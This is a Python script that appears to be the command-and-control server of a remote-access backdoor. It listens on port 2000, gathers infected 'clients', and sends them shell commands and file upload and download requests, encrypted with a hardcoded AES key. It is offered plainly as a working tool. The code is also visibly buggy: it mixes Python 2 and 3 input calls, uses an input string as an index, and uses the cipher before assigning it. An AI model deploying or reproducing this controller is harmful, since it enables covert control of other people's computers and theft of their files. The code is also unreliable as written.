#!/usr/bin/env python3

import os
import sys
import socket
from Crypto.Cipher import AES
from base64 import b64encode, b64decode

Encode = lambda c, x: b64encode(c.encrypt(x))
Decode = lambda c, x: c.decrypt(b64decode(x))

def pr(s):
  print(s + '\n')

def get_cipher():
  key = b'xxxx cccc vvvv b'
  iv  = b'gggg hhhh jjjj k'
  
  cipher = AES.new(key, AES.MODE_CFB, iv)

  return cipher

# clear
if os.name == 'posix': s = 'clear' # linux
if os.name == 'nt':    s = 'cls'   # windows
clear = lambda: os.system(s)

# server socket
from socket import AF_INET, SOCK_STREAM
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()

# client sockets
socks = []
clients = []
active = False

# data: cmd/data
def Send(sock, data, end='EOFEOFEOFEOFEOFX'):
  sock.sendall(Encode(cipher, data + end))

def Receive(sock, end='EOFEOFEOFEOFEOFX'):
  data = ''

  d = sock.recv(1024)
  while(d):
    data += Decode(cipher, d)
    if data.endswith(end):
      break
    else:
      d = sock.recv(1024)

  return data[:-len(end)]

def download(sock, file):
    try:
        f = open(file, 'wb')
    except IOError:
        pr('Error opening file.')
        return

    Send(sock, 'download ' + file)

    pr('Downloading ' + file)

    d = Receive(sock)
    f.write(d)
    f.close()

def upload(sock, file):
    try:
        f = open(file, 'rb')
    except IOError:
        pr('Error opening file.')
        return

    Send(sock, 'upload ' + file)

    pr('Uploading ' + file)

    while True:
        d = f.read()
        if not d: 
            break
        Send(sock, d, '')

    f.close()

def refresh():
  clear()

  pr('Listening for clients...')

  l = len(clients)

  if l == 0:
    pr('...')
    return

  for i in range(0, l):
    j = i + 1
    pr('Client %d: %s' % (j, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  try:
    server.settimeout(10)

    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))

    refresh()
  except KeyboardInterrupt:
    activate = input('Enter option: ')

    if activate == 0:
      pr('Exiting...')

      for i in range(0, len(socks)):
        socks[i].close()

      sys.exit()

    Send(socks[activate], 'Activate')

    pr('Activating client %d: %s' % (activate, clients[activate]))

    activate -= 1
    cipher = get_cipher()
    active = True

  while active:
    sock = socks[activate]
    client = clients[activate]

    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)

      sock.close()
      socks.remove(sock)
      clients.remove(client)
      refresh()
     
      break

    if data == 'exit':
      active = False
      pr('Exit.')

      sock.close()
      socks.remove(sock)
      clients.remove(client)
      refresh()

      break

    elif data != '':
      sys.stdout.write(data)
      nc = raw_input() # next cmd

      if nc.startswith('download '):
        download(sock, nc.split(' ')[1])

      elif nc.startswith('upload '):
        upload(sock, nc.split(' ')[1])

      elif nc != '':
        Send(sock, nc)

      elif nc == '':
        pr('Think before you type.')
